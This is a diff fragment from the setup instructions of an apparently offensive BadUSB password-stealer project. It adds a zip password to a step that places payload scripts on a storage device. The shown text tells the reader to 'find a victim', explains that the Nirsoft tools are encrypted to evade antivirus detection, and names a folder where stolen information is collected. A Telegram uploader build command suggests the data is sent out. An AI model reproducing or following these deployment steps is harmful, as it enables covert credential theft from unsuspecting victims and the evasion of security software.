@@ -153,7 +153,7 @@ pyinstaller --onefile -w telegram_uploader.py
 
 7. Download 7-Zip Extra: standalone console version, 7z DLL, Plugin for Far Manager [here](https://www.7-zip.org/download.html)
 
-8. Put BadUSB_passStealer.txt in the root directory of your MMS, ciaoV2_storage.ps1 in MMS/passStealer/, fin_storage.ps1 in MMS/passStealer, 7z/ in MMS/passStealer and tools.zip in MMS/passStealer;
+8. Put BadUSB_passStealer.txt in the root directory of your MMS, ciaoV2_storage.ps1 in MMS/passStealer/, fin_storage.ps1 in MMS/passStealer, 7z/ in MMS/passStealer and tools.zip (password : tools) in MMS/passStealer;
 
 9. Find a victim and enjoy !;
 **Explaination** : Nirsoft Tools are encrypted with a password to not be detected by antivirus, so we need 7zip to extract this zip in command line. Dump folder is where all stolen informations will be.
